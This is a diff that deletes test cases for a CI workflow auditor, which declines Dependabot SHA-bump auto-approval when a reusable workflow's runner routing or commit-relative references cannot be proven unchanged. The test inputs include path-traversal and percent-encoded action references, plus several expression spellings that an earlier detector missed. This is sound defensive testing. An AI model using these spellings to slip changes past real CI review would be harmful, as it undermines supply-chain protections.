-      workflows: {
-        "ci.yml": `jobs:
-  scan:
-    uses: ${DEPENDABOT_BUMP_REFERENCE}
-    with:
-      runner: ubuntu-24.04
-`,
-      },
-    });
-    const findings = await audit(root, {
-      fetchImpl: fetchImplFor({
-        [SHA]: REUSABLE_WORKFLOW_BASIS_SOURCE,
-        [DEPENDABOT_BUMP_SHA]: `${REUSABLE_WORKFLOW_BASIS_SOURCE}${malformedJob}`,
-      }),
-    });
-    const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
-    assert.ok(contractFinding, kind);
-    assert.match(
-      contractFinding.message,
-      /auto-approval declined: job extra is malformed; jobs\.extra must be a mapping/,
-      kind,
-    );
-  }
-});
-
-test("Dependabot SHA bump is declined when the previously reviewed basis has a malformed job", async () => {
-  const root = await repository({
-    visibility: "public",
-    selfHostedCi: false,
-    workflows: {
-      "ci.yml": `jobs:
-  scan:
-    uses: ${DEPENDABOT_BUMP_REFERENCE}
-    with:
-      runner: ubuntu-24.04
-`,
-    },
-  });
-  const findings = await audit(root, {
-    fetchImpl: fetchImplFor({
-      [SHA]: `${REUSABLE_WORKFLOW_BASIS_SOURCE}  extra: []\n`,
-      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_BASIS_SOURCE,
-    }),
-  });
-  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
-  assert.ok(contractFinding);
-  assert.match(
-    contractFinding.message,
-    new RegExp(
-      `auto-approval declined: reviewed basis .*@${SHA} could not be fetched, parsed, or validated: job extra is malformed; jobs\\.extra must be a mapping`,
-    ),
-  );
-});
-
-// The tests below this point cover every needs-indirection spelling this
-// detector has previously been shown to miss (property dereference, then
-// each index-syntax variant). They predate the switch from a precise
-// needs.<job>.outputs.<name>-shaped blocklist to the coarse needs-reference
-// catch-all above (`containsNeedsReference`/`NEEDS_REFERENCE` in
-// runner-policy.mjs), and are kept and re-verified here rather than deleted:
-// the coarse catch-all must still decline every one of these previously
-// fixed cases, not just the new ones it was built to close.
-//
-// Regression test for a gap where jobRoutingSurface recorded only the
-// literal declared runs-on expression. A fetched reusable workflow's job can
-// route through needs.<job>.outputs.<name> -- the same needs-output pattern
-// this analyzer already reads for local job wiring -- so the
-// producing job's output value (here pick's runs-on) can change the actual
-// runner boundary while the consuming job's runs-on expression stays a
-// byte-identical `needs.pick.outputs.runner`. Auto-approval cannot safely
-// resolve that indirection, so it must decline rather than treat the surface
-// as unchanged.
-test("Dependabot SHA bump that routes through a needs.<job>.outputs indirection is declined", async () => {
-  const root = await repository({
-    visibility: "public",
-    selfHostedCi: false,
-    workflows: {
-      "ci.yml": `jobs:
-  scan:
-    uses: ${DEPENDABOT_BUMP_REFERENCE}
-    with:
-      runner: ubuntu-24.04
-`,
-    },
-  });
-  const findings = await audit(root, {
-    fetchImpl: fetchImplFor({
-      [SHA]: REUSABLE_WORKFLOW_DYNAMIC_ROUTING_SOURCE,
-      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_DYNAMIC_ROUTING_COSMETIC_SOURCE,
-    }),
-  });
-  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
-  assert.ok(contractFinding);
-  assert.match(
-    contractFinding.message,
-    /auto-approval declined: job scan references needs in a routing-relevant field, which cannot be safely diffed for auto-approval/,
-  );
-});
-
-// Regression test for a gap where the needs-output detector matched only
-// property-dereference syntax (`needs.<job>.outputs.<name>`). GitHub's
-// expression syntax accepts the equivalent index syntax
-// (`needs.<job>.outputs['<name>']`) for the same output; a fetched reusable
-// workflow using that spelling was not declined, and because jobRoutingSurface
-// also omits the producer job's own outputs, a SHA bump could keep the
-// consuming job's `runs-on` string byte-identical while the producing job's
-// value (and therefore the real runner boundary) changed underneath it.
-for (const [label, source, cosmeticSource] of [
-  [
-    "single-quoted index syntax",
-    REUSABLE_WORKFLOW_DYNAMIC_ROUTING_INDEX_SYNTAX_SOURCE,
-    REUSABLE_WORKFLOW_DYNAMIC_ROUTING_INDEX_SYNTAX_COSMETIC_SOURCE,
-  ],
-  [
-    "double-quoted index syntax",
-    REUSABLE_WORKFLOW_DYNAMIC_ROUTING_DOUBLE_QUOTE_INDEX_SYNTAX_SOURCE,
-    REUSABLE_WORKFLOW_DYNAMIC_ROUTING_DOUBLE_QUOTE_INDEX_SYNTAX_COSMETIC_SOURCE,
-  ],
-  [
-    "fully bracketed index syntax on the job-id and outputs segments",
-    REUSABLE_WORKFLOW_DYNAMIC_ROUTING_FULLY_BRACKETED_SOURCE,
-    REUSABLE_WORKFLOW_DYNAMIC_ROUTING_FULLY_BRACKETED_COSMETIC_SOURCE,
-  ],
-]) {
-  test(`Dependabot SHA bump that routes through a needs.<job>.outputs ${label} indirection is declined`, async () => {
-    const root = await repository({
-      visibility: "public",
-      selfHostedCi: false,
-      workflows: {
-        "ci.yml": `jobs:
-  scan:
-    uses: ${DEPENDABOT_BUMP_REFERENCE}
-    with:
-      runner: ubuntu-24.04
-`,
-      },
-    });
-    const findings = await audit(root, {
-      fetchImpl: fetchImplFor({
-        [SHA]: source,
-        [DEPENDABOT_BUMP_SHA]: cosmeticSource,
-      }),
-    });
-    const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
-    assert.ok(contractFinding);
-    assert.match(
-      contractFinding.message,
-      /auto-approval declined: job scan references needs in a routing-relevant field, which cannot be safely diffed for auto-approval/,
-    );
-  });
-}
-
-// Regression tests for the coarse needs-reference catch-all that replaced
-// the precise needs.<job>.outputs.<name>-shaped detector. The catch-all
-// declines whenever a routing-relevant field mentions `needs` at all,
-// instead of enumerating specific dangerous spellings, so each case below
-// is a syntax the *old* precise detector would have missed:
-//
-// - "object-filter output route" is the exact P1 finding that motivated the
-//   rewrite: `needs.*.outputs.runner` has no named job-id segment, so a
-//   job-id-shaped pattern can never enumerate it.
-// - "case-variant needs reference" proves the catch-all is case-insensitive,
-//   matching GitHub's own case-insensitive context/property evaluation.
-// - "needs job-result reference (no outputs segment)" proves the catch-all
-//   catches more than just outputs indirection: any `needs` property access
-//   in a routing field is equally unresolvable through static surface
-//   diffing, and the old detector's required `.outputs` segment would have
-//   missed this one entirely, not merely spelled it differently.
-// - "function-wrapped needs reference" proves the catch-all matches the bare
-//   `needs` token itself rather than requiring an immediate `.`/`[`
-//   accessor: GitHub's expression functions can take `needs` as a bare
-//   argument (`fromJSON(toJSON(needs)).pick.outputs.runner`), so a detector
-//   that required `needs` to be immediately followed by a dereference
-//   accessor would miss this indirection entirely.
-for (const [label, source, cosmeticSource] of [
-  [
-    "object-filter output route",
-    REUSABLE_WORKFLOW_DYNAMIC_ROUTING_OBJECT_FILTER_SOURCE,
-    REUSABLE_WORKFLOW_DYNAMIC_ROUTING_OBJECT_FILTER_COSMETIC_SOURCE,
-  ],
-  [
-    "case-variant needs reference",
-    REUSABLE_WORKFLOW_DYNAMIC_ROUTING_CASE_VARIANT_SOURCE,
-    REUSABLE_WORKFLOW_DYNAMIC_ROUTING_CASE_VARIANT_COSMETIC_SOURCE,
-  ],
-  [
-    "needs job-result reference (no outputs segment)",
-    REUSABLE_WORKFLOW_DYNAMIC_ROUTING_JOB_RESULT_SOURCE,
-    REUSABLE_WORKFLOW_DYNAMIC_ROUTING_JOB_RESULT_COSMETIC_SOURCE,
-  ],
-  [
-    "function-wrapped needs reference",
-    REUSABLE_WORKFLOW_DYNAMIC_ROUTING_FUNCTION_WRAPPED_SOURCE,
-    REUSABLE_WORKFLOW_DYNAMIC_ROUTING_FUNCTION_WRAPPED_COSMETIC_SOURCE,
-  ],
-]) {
-  test(`Dependabot SHA bump that routes through a ${label} is declined`, async () => {
-    const root = await repository({
-      visibility: "public",
-      selfHostedCi: false,
-      workflows: {
-        "ci.yml": `jobs:
-  scan:
-    uses: ${DEPENDABOT_BUMP_REFERENCE}
-    with:
-      runner: ubuntu-24.04
-`,
-      },
-    });
-    const findings = await audit(root, {
-      fetchImpl: fetchImplFor({
-        [SHA]: source,
-        [DEPENDABOT_BUMP_SHA]: cosmeticSource,
-      }),
-    });
-    const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
-    assert.ok(contractFinding);
-    assert.match(
-      contractFinding.message,
-      /auto-approval declined: job scan references needs in a routing-relevant field, which cannot be safely diffed for auto-approval/,
-    );
-  });
-}
-
-test("Dependabot SHA bump is declined when the previously reviewed basis routes through a needs.<job>.outputs indirection", async () => {
-  const root = await repository({
-    visibility: "public",
-    selfHostedCi: false,
-    workflows: {
-      "ci.yml": `jobs:
-  scan:
-    uses: ${DEPENDABOT_BUMP_REFERENCE}
-    with:
-      runner: ubuntu-24.04
-`,
-    },
-  });
-  const findings = await audit(root, {
-    fetchImpl: fetchImplFor({
-      [SHA]: REUSABLE_WORKFLOW_DYNAMIC_ROUTING_SOURCE,
-      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_BASIS_SOURCE,
-    }),
-  });
-  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
-  assert.ok(contractFinding);
-  assert.match(
-    contractFinding.message,
-    new RegExp(
-      `auto-approval declined: reviewed basis .*@${SHA} could not be fetched, parsed, or validated: job scan references needs in a routing-relevant field, which cannot be safely diffed for auto-approval`,
-    ),
-  );
-});
-
-// Regression test for a gap where a called workflow's job-level
-// `uses: ./.github/workflows/<file>.yml` was recorded only as its literal
-// string. GitHub resolves the `./` prefix from the same commit as the
-// caller, so a SHA bump can leave the caller byte-identical while the
-// nested workflow changes runners or secrets underneath it. Both sources
-// below are byte-identical on purpose, and the stub serves no git tree: with
-// no object SHA to compare, the decline must still fire.
-test("Dependabot SHA bump is declined when a repository-local nested workflow cannot be proven unchanged", async () => {
-  const root = await repository({
-    visibility: "public",
-    selfHostedCi: false,
-    workflows: {
-      "ci.yml": `jobs:
-  scan:
-    uses: ${DEPENDABOT_BUMP_REFERENCE}
-    with:
-      runner: ubuntu-24.04
-`,
-    },
-  });
-  const findings = await audit(root, {
-    fetchImpl: fetchImplFor({
-      [SHA]: REUSABLE_WORKFLOW_LOCAL_NESTED_WORKFLOW_SOURCE,
-      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_LOCAL_NESTED_WORKFLOW_SOURCE,
-    }),
-  });
-  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
-  assert.ok(contractFinding);
-  assert.match(
-    contractFinding.message,
-    new RegExp(
-      `auto-approval declined: could not fetch the git tree of melodic-software/ci-workflows@${DEPENDABOT_BUMP_SHA}: 404 Not Found`,
-    ),
-  );
-});
-
-// A step-level `uses: ./path/to/action` resolves from the job's checked-out
-// workspace, not from the reusable workflow's commit, so no object in the
-// source repository proves its content; it stays ineligible even when the
-// tree at that path is unchanged.
-test("Dependabot SHA bump is declined when a called job's step uses a workspace-relative action", async () => {
-  const root = await repository({
-    visibility: "public",
-    selfHostedCi: false,
-    workflows: {
-      "ci.yml": `jobs:
-  scan:
-    uses: ${DEPENDABOT_BUMP_REFERENCE}
-    with:
-      runner: ubuntu-24.04
-`,
-    },
-  });
-  const findings = await audit(root, {
-    fetchImpl: commitRelativeFetchImpl({
-      workflows: {
-        [SHA]: REUSABLE_WORKFLOW_LOCAL_ACTION_STEP_SOURCE,
-        [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_LOCAL_ACTION_STEP_SOURCE,
-      },
-      trees: {
-        [SHA]: scanSetupTree(SCAN_SETUP_TREE_SHA),
-        [DEPENDABOT_BUMP_SHA]: scanSetupTree(SCAN_SETUP_TREE_SHA),
-      },
-      files: { ".github/actions/scan-setup/action.yml": SCAN_SETUP_COMPOSITE_SOURCE },
-    }),
-  });
-  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
-  assert.ok(contractFinding);
-  assert.match(
-    contractFinding.message,
-    /auto-approval declined: .* job scan uses the workspace-relative action \.\/\.github\/actions\/scan-setup, whose content comes from the job's checked-out workspace and cannot be safely diffed for auto-approval/,
-  );
-});
-
-test("Dependabot SHA bump is declined when the previously reviewed basis uses a repository-local reference", async () => {
-  const root = await repository({
-    visibility: "public",
-    selfHostedCi: false,
-    workflows: {
-      "ci.yml": `jobs:
-  scan:
-    uses: ${DEPENDABOT_BUMP_REFERENCE}
-    with:
-      runner: ubuntu-24.04
-`,
-    },
-  });
-  const findings = await audit(root, {
-    fetchImpl: fetchImplFor({
-      [SHA]: REUSABLE_WORKFLOW_LOCAL_NESTED_WORKFLOW_SOURCE,
-      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_BASIS_SOURCE,
-    }),
-  });
-  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
-  assert.ok(contractFinding);
-  assert.match(
-    contractFinding.message,
-    new RegExp(
-      `auto-approval declined: reviewed basis .*@${SHA} could not be fetched, parsed, or validated: could not fetch the git tree of melodic-software/ci-workflows@${SHA}: 404 Not Found`,
-    ),
-  );
-});
-
-// A `$/` reference resolves from the reusable workflow's own repository at
-// the commit being run, so it moves with the SHA bump exactly as a job-level
-// `./` nested workflow does. Auto-approval compares the git object each such
-// reference names (tree for an action directory, blob for a nested workflow)
-// at the reviewed basis and at the candidate; identical object SHAs mean
-// byte-identical executed content.
-const COMMIT_RELATIVE_TREE_URL =
-  /^https:\/\/api\.github\.com\/repos\/melodic-software\/ci-workflows\/git\/trees\/([0-9a-f]{40})\?recursive=1$/;
-const COMMIT_RELATIVE_RAW_URL =
-  /^https:\/\/raw\.githubusercontent\.com\/melodic-software\/ci-workflows\/([0-9a-f]{40})\/(.+)$/;
-const SCAN_SETUP_TREE_SHA = "5ca75e7a0000000000000000000000000000aaaa";
-const SCAN_SETUP_CHANGED_TREE_SHA = "5ca75e7a0000000000000000000000000000bbbb";
-const SCAN_SETUP_ACTION_BLOB_SHA = "ac710000000000000000000000000000000000aa";
-const SHARED_TREE_SHA = "54a4ed000000000000000000000000000000aaaa";
-const SHARED_CHANGED_TREE_SHA = "54a4ed000000000000000000000000000000bbbb";
-const NESTED_SCAN_BLOB_SHA = "4e57ed000000000000000000000000000000aaaa";
-const NESTED_SCAN_CHANGED_BLOB_SHA = "4e57ed000000000000000000000000000000bbbb";
-
-const REUSABLE_WORKFLOW_DOLLAR_ACTION_STEP_SOURCE = `name: osv-scanner
-on:
-  workflow_call:
-    inputs:
-      runner:
-        required: true
-        type: string
-    secrets:
-      token:
-        required: false
-permissions:
-  contents: read
-jobs:
-  scan:
-    runs-on: \${{ inputs.runner }}
-    steps:
-      - uses: $/.github/actions/scan-setup
-`;
-
-const SCAN_SETUP_COMPOSITE_SOURCE = `name: scan-setup
-runs:
-  using: composite
-  steps:
-    - run: echo setup
-      shell: bash
-`;
-
-const SCAN_SETUP_DELEGATING_COMPOSITE_SOURCE = `name: scan-setup
-runs:
-  using: composite
-  steps:
-    - uses: $/.github/actions/shared
-`;
-
-const NESTED_SCAN_WORKFLOW_SOURCE = `name: nested-scan
-on:
-  workflow_call: {}
-permissions:
-  contents: read
-jobs:
-  nested:
-    runs-on: ubuntu-24.04
-    steps:
-      - run: echo nested
-`;
-
-function scanSetupTree(treeSha, { actionSource = SCAN_SETUP_ACTION_BLOB_SHA, extra = [] } = {}) {
-  return [
-    { path: ".github/actions/scan-setup", type: "tree", sha: treeSha },
-    { path: ".github/actions/scan-setup/action.yml", type: "blob", sha: actionSource },
-    ...extra,
-  ];
-}
-
-// Routes the two GitHub surfaces auto-approval reads: the recursive git tree
-// of a commit (api.github.com) and raw file content at a commit
-// (raw.githubusercontent.com). `files` maps "<sha>:<path>" or "<path>" to
-// content; every other request is a 404.
-function commitRelativeFetchImpl({ workflows, trees, files = {}, truncated = false }) {
-  return releasedShas(async (url) => {
-    const treeMatch = COMMIT_RELATIVE_TREE_URL.exec(url);
-    if (treeMatch) {
-      const tree = trees[treeMatch[1]];
-      if (!tree) {
-        return { ok: false, status: 404, statusText: "Not Found" };
-      }
-      return { ok: true, json: async () => ({ sha: treeMatch[1], truncated, tree }) };
-    }
-    const rawMatch = COMMIT_RELATIVE_RAW_URL.exec(url);
-    if (rawMatch) {
-      const [, revision, filePath] = rawMatch;
-      const body =
-        filePath === ".github/workflows/osv-scanner.yml"
-          ? workflows[revision]
-          : (files[`${revision}:${filePath}`] ?? files[filePath]);
-      if (body !== undefined) {
-        return { ok: true, text: async () => body };
-      }
-    }
-    return { ok: false, status: 404, statusText: "Not Found" };
-  }, Object.keys(workflows));
-}
-
-async function dependabotBumpRepository() {
-  return repository({
-    visibility: "public",
-    selfHostedCi: false,
-    workflows: {
-      "ci.yml": `jobs:
-  scan:
-    uses: ${DEPENDABOT_BUMP_REFERENCE}
-    with:
-      runner: ubuntu-24.04
-`,
-    },
-  });
-}
-
-function contractFindingMessage(findings) {
-  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
-  assert.ok(contractFinding);
-  return contractFinding.message;
-}
-
-test("Dependabot SHA bump auto-approves a $/ action step whose tree is unchanged", async () => {
-  const root = await dependabotBumpRepository();
-  const findings = await audit(root, {
-    fetchImpl: commitRelativeFetchImpl({
-      workflows: {
-        [SHA]: REUSABLE_WORKFLOW_DOLLAR_ACTION_STEP_SOURCE,
-        [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_DOLLAR_ACTION_STEP_SOURCE,
-      },
-      trees: {
-        [SHA]: scanSetupTree(SCAN_SETUP_TREE_SHA),
-        [DEPENDABOT_BUMP_SHA]: scanSetupTree(SCAN_SETUP_TREE_SHA),
-      },
-      files: { ".github/actions/scan-setup/action.yml": SCAN_SETUP_COMPOSITE_SOURCE },
-    }),
-  });
-  assert.deepEqual(findings, []);
-});
-
-test("Dependabot SHA bump decline names the newest basis when only a commit-relative object differs", async () => {
-  const contract = {
-    routing: "runner-input",
-    runnerInput: "runner",
-    allowedInputs: ["runner"],
-    allowedSecrets: {},
-  };
-  const root = await repository({
-    visibility: "public",
-    selfHostedCi: false,
     policyOverrides: {
       approvedReusableWorkflowContracts: {
-        [REUSABLE_REFERENCE]: contract,
-        [ALTERNATE_REUSABLE_REFERENCE]: { ...contract },
-      },
-    },
-    workflows: {
-      "ci.yml": `jobs:
-  scan:
-    uses: ${DEPENDABOT_BUMP_REFERENCE}
-    with:
-      runner: ubuntu-24.04
-`,
-    },
-  });
-  // SHA sorts first and differs in security surface; ALTERNATE_REVIEWED_SHA sorts
-  // last, matches the candidate's surface, and differs only in the scan-setup tree.
-  const findings = await audit(root, {
-    fetchImpl: commitRelativeFetchImpl({
-      workflows: {
-        [SHA]: REUSABLE_WORKFLOW_CHANGED_PERMISSIONS_SOURCE,
-        [ALTERNATE_REVIEWED_SHA]: REUSABLE_WORKFLOW_DOLLAR_ACTION_STEP_SOURCE,
-        [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_DOLLAR_ACTION_STEP_SOURCE,
-      },
-      trees: {
-        [SHA]: scanSetupTree(SCAN_SETUP_TREE_SHA),
-        [ALTERNATE_REVIEWED_SHA]: scanSetupTree(SCAN_SETUP_TREE_SHA),
-        [DEPENDABOT_BUMP_SHA]: scanSetupTree(SCAN_SETUP_CHANGED_TREE_SHA),
-      },
-      files: { ".github/actions/scan-setup/action.yml": SCAN_SETUP_COMPOSITE_SOURCE },
-    }),
-  });
-  const message = contractFindingMessage(findings);
-  assert.match(
-    message,
-    new RegExp(
-      `auto-approval declined: commit-relative reference \\.github/actions/scan-setup changed since the previously reviewed ${REUSABLE_PATH}@${ALTERNATE_REVIEWED_SHA}`,
-    ),
-  );
-  assert.doesNotMatch(
-    message,
-    new RegExp(`changed since the previously reviewed ${REUSABLE_PATH}@${SHA}`),
-  );
-});
-
-test("Dependabot SHA bump declines a $/ action step whose tree changed", async () => {
-  const root = await dependabotBumpRepository();
-  const findings = await audit(root, {
-    fetchImpl: commitRelativeFetchImpl({
-      workflows: {
-        [SHA]: REUSABLE_WORKFLOW_DOLLAR_ACTION_STEP_SOURCE,
-        [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_DOLLAR_ACTION_STEP_SOURCE,
-      },
-      trees: {
-        [SHA]: scanSetupTree(SCAN_SETUP_TREE_SHA),
-        [DEPENDABOT_BUMP_SHA]: scanSetupTree(SCAN_SETUP_CHANGED_TREE_SHA),
-      },
-      files: { ".github/actions/scan-setup/action.yml": SCAN_SETUP_COMPOSITE_SOURCE },
-    }),
-  });
-  assert.match(
-    contractFindingMessage(findings),
-    new RegExp(
-      `auto-approval declined: commit-relative reference \\.github/actions/scan-setup changed since the previously reviewed ${REUSABLE_PATH}@${SHA}`,
-    ),
-  );
-});
-
-test("Dependabot SHA bump declines a $/ action step when the commit tree cannot be fetched", async () => {
-  const root = await dependabotBumpRepository();
-  const findings = await audit(root, {
-    fetchImpl: commitRelativeFetchImpl({
-      workflows: {
-        [SHA]: REUSABLE_WORKFLOW_DOLLAR_ACTION_STEP_SOURCE,
-        [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_DOLLAR_ACTION_STEP_SOURCE,
-      },
-      trees: { [SHA]: scanSetupTree(SCAN_SETUP_TREE_SHA) },
-      files: { ".github/actions/scan-setup/action.yml": SCAN_SETUP_COMPOSITE_SOURCE },
-    }),
-  });
-  assert.match(
-    contractFindingMessage(findings),
-    new RegExp(
-      `auto-approval declined: could not fetch the git tree of melodic-software/ci-workflows@${DEPENDABOT_BUMP_SHA}: 404 Not Found`,
-    ),
-  );
-});
-
-test("Dependabot SHA bump declines a $/ action whose own $/ dependency tree changed", async () => {
-  const root = await dependabotBumpRepository();
-  const sharedTree = (sha) => [
-    { path: ".github/actions/shared", type: "tree", sha },
-    { path: ".github/actions/shared/action.yml", type: "blob", sha },
-  ];
-  const findings = await audit(root, {
-    fetchImpl: commitRelativeFetchImpl({
-      workflows: {
-        [SHA]: REUSABLE_WORKFLOW_DOLLAR_ACTION_STEP_SOURCE,
-        [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_DOLLAR_ACTION_STEP_SOURCE,
-      },
-      trees: {
-        [SHA]: scanSetupTree(SCAN_SETUP_TREE_SHA, { extra: sharedTree(SHARED_TREE_SHA) }),
-        [DEPENDABOT_BUMP_SHA]: scanSetupTree(SCAN_SETUP_TREE_SHA, {
-          extra: sharedTree(SHARED_CHANGED_TREE_SHA),
-        }),
-      },
-      files: {
-        ".github/actions/scan-setup/action.yml": SCAN_SETUP_DELEGATING_COMPOSITE_SOURCE,
-        ".github/actions/shared/action.yml": SCAN_SETUP_COMPOSITE_SOURCE,
-      },
-    }),
-  });
-  assert.match(
-    contractFindingMessage(findings),
-    /auto-approval declined: commit-relative reference \.github\/actions\/shared changed since the previously reviewed/,
-  );
-});
-
-test("Dependabot SHA bump declines a $/ action step the reviewed basis never referenced", async () => {
-  const root = await dependabotBumpRepository();
-  const findings = await audit(root, {
-    fetchImpl: commitRelativeFetchImpl({
-      workflows: {
-        [SHA]: REUSABLE_WORKFLOW_BASIS_SOURCE,
-        [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_DOLLAR_ACTION_STEP_SOURCE,
-      },
-      trees: {
-        [SHA]: scanSetupTree(SCAN_SETUP_TREE_SHA),
-        [DEPENDABOT_BUMP_SHA]: scanSetupTree(SCAN_SETUP_TREE_SHA),
-      },
-      files: { ".github/actions/scan-setup/action.yml": SCAN_SETUP_COMPOSITE_SOURCE },
-    }),
-  });
-  assert.match(
-    contractFindingMessage(findings),
-    /auto-approval declined: commit-relative reference \.github\/actions\/scan-setup changed since the previously reviewed/,
-  );
-});
-
-test("Dependabot SHA bump auto-approves a ./ nested workflow whose blob is unchanged", async () => {
-  const root = await dependabotBumpRepository();
-  const nestedTree = [
-    { path: ".github/workflows/nested-scan.yml", type: "blob", sha: NESTED_SCAN_BLOB_SHA },
-  ];
-  const findings = await audit(root, {
-    fetchImpl: commitRelativeFetchImpl({
-      workflows: {
-        [SHA]: REUSABLE_WORKFLOW_LOCAL_NESTED_WORKFLOW_SOURCE,
-        [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_LOCAL_NESTED_WORKFLOW_SOURCE,
-      },
-      trees: { [SHA]: nestedTree, [DEPENDABOT_BUMP_SHA]: nestedTree },
-      files: { ".github/workflows/nested-scan.yml": NESTED_SCAN_WORKFLOW_SOURCE },
-    }),
-  });
-  assert.deepEqual(findings, []);
-});
-
-test("Dependabot SHA bump declines a ./ nested workflow whose blob changed", async () => {
-  const root = await dependabotBumpRepository();
-  const nestedTree = (sha) => [{ path: ".github/workflows/nested-scan.yml", type: "blob", sha }];
-  const findings = await audit(root, {
-    fetchImpl: commitRelativeFetchImpl({
-      workflows: {
-        [SHA]: REUSABLE_WORKFLOW_LOCAL_NESTED_WORKFLOW_SOURCE,
-        [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_LOCAL_NESTED_WORKFLOW_SOURCE,
-      },
-      trees: {
-        [SHA]: nestedTree(NESTED_SCAN_BLOB_SHA),
-        [DEPENDABOT_BUMP_SHA]: nestedTree(NESTED_SCAN_CHANGED_BLOB_SHA),
-      },
-      files: { ".github/workflows/nested-scan.yml": NESTED_SCAN_WORKFLOW_SOURCE },
-    }),
-  });
-  assert.match(
-    contractFindingMessage(findings),
-    new RegExp(
-      `auto-approval declined: commit-relative reference \\.github/workflows/nested-scan\\.yml changed since the previously reviewed ${REUSABLE_PATH}@${SHA}`,
-    ),
-  );
-});
-
-function dollarStepWorkflow(uses) {
-  return REUSABLE_WORKFLOW_DOLLAR_ACTION_STEP_SOURCE.replace(
-    "- uses: $/.github/actions/scan-setup",
-    `- uses: ${JSON.stringify(uses)}`,
-  );
-}
-
-// Serves the same workflow, tree, and files at the basis and the candidate,
-// so any decline comes from the reference shape or the shared content.
-function unchangedCommitRelativeFetchImpl({
-  workflow = REUSABLE_WORKFLOW_DOLLAR_ACTION_STEP_SOURCE,
-  tree = scanSetupTree(SCAN_SETUP_TREE_SHA),
-  actionSource = SCAN_SETUP_COMPOSITE_SOURCE,
-  truncated = false,
-} = {}) {
-  return commitRelativeFetchImpl({
-    workflows: { [SHA]: workflow, [DEPENDABOT_BUMP_SHA]: workflow },
-    trees: { [SHA]: tree, [DEPENDABOT_BUMP_SHA]: tree },
-    files: { ".github/actions/scan-setup/action.yml": actionSource },
-    truncated,
-  });
-}
-
-async function unchangedBumpDecline(options) {
-  const root = await dependabotBumpRepository();
-  return contractFindingMessage(
-    await audit(root, { fetchImpl: unchangedCommitRelativeFetchImpl(options) }),
-  );
-}
-
-for (const uses of ["$/.github/actions/../../x", "$/./x", "$//x", "$/x@main", "$/%2e%2e/x", "$/"]) {
-  test(`Dependabot SHA bump declines the non-plain $/ reference ${uses}`, async () => {
-    const message = await unchangedBumpDecline({ workflow: dollarStepWorkflow(uses) });
-    assert.ok(
-      message.includes(`uses ${uses}, which is not a plain repository directory path`),
-      message,
-    );
-  });
-}
-
-test("Dependabot SHA bump declines a $/ reference that names a file, not a directory", async () => {
-  const message = await unchangedBumpDecline({
-    tree: [{ path: ".github/actions/scan-setup", type: "blob", sha: SCAN_SETUP_TREE_SHA }],
-  });
-  assert.match(
-    message,
-    /commit-relative reference \.github\/actions\/scan-setup is not a directory/,
-  );
-});
-
-test("Dependabot SHA bump declines a $/ action directory without action.yml", async () => {
-  const message = await unchangedBumpDecline({
-    tree: [{ path: ".github/actions/scan-setup", type: "tree", sha: SCAN_SETUP_TREE_SHA }],
-  });
-  assert.match(
-    message,
-    /\.github\/actions\/scan-setup@[0-9a-f]{40} has no action\.yml or action\.yaml/,
-  );
-});
-
-test("Dependabot SHA bump declines when the commit tree is truncated", async () => {
-  const message = await unchangedBumpDecline({ truncated: true });
-  assert.match(
-    message,
-    /the git tree of melodic-software\/ci-workflows@[0-9a-f]{40} is truncated or malformed/,
-  );
-});
-
-test("Dependabot SHA bump declines with a readable reason when action content rejects with a non-Error", async () => {
-  const root = await dependabotBumpRepository();
-  const inner = unchangedCommitRelativeFetchImpl();
-  const findings = await audit(root, {
-    fetchImpl: async (url, init) =>
-      url.endsWith("/.github/actions/scan-setup/action.yml")
-        ? {
-            ok: true,
-            text: () => Promise.reject("connection reset"),
-          }
-        : inner(url, init),
-  });
-  assert.match(
-    contractFindingMessage(findings),
-    /could not fetch melodic-software\/ci-workflows\/\.github\/actions\/scan-setup\/action\.yml@[0-9a-f]{40}: connection reset/,
-  );
-});
-
-test("Dependabot SHA bump declines when only the reviewed basis reaches a $/ action", async () => {
-  const root = await dependabotBumpRepository();
-  const findings = await audit(root, {
-    fetchImpl: commitRelativeFetchImpl({
-      workflows: {
-        [SHA]: REUSABLE_WORKFLOW_DOLLAR_ACTION_STEP_SOURCE,
-        [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_BASIS_SOURCE,
-      },
-      trees: {
-        [SHA]: scanSetupTree(SCAN_SETUP_TREE_SHA),
-        [DEPENDABOT_BUMP_SHA]: scanSetupTree(SCAN_SETUP_TREE_SHA),
-      },
-      files: { ".github/actions/scan-setup/action.yml": SCAN_SETUP_COMPOSITE_SOURCE },
-    }),
-  });
-  assert.match(
-    contractFindingMessage(findings),
-    new RegExp(
-      `commit-relative reference \\.github/actions/scan-setup changed since the previously reviewed ${REUSABLE_PATH}@${SHA}`,
-    ),
-  );
-});
-
-for (const [shape, entry] of [
-  ["symlink", { type: "blob", mode: "120000" }],
-  ["submodule", { type: "commit", mode: "160000" }],
-]) {
-  test(`Dependabot SHA bump declines a $/ action directory holding a ${shape}`, async () => {
-    const message = await unchangedBumpDecline({
-      tree: scanSetupTree(SCAN_SETUP_TREE_SHA, {
-        extra: [{ path: ".github/actions/scan-setup/outside", sha: SHARED_TREE_SHA, ...entry }],
-      }),
-    });
-    assert.match(
-      message,
-      /contains the symlink or submodule \.github\/actions\/scan-setup\/outside/,
-    );
-  });
-}
-
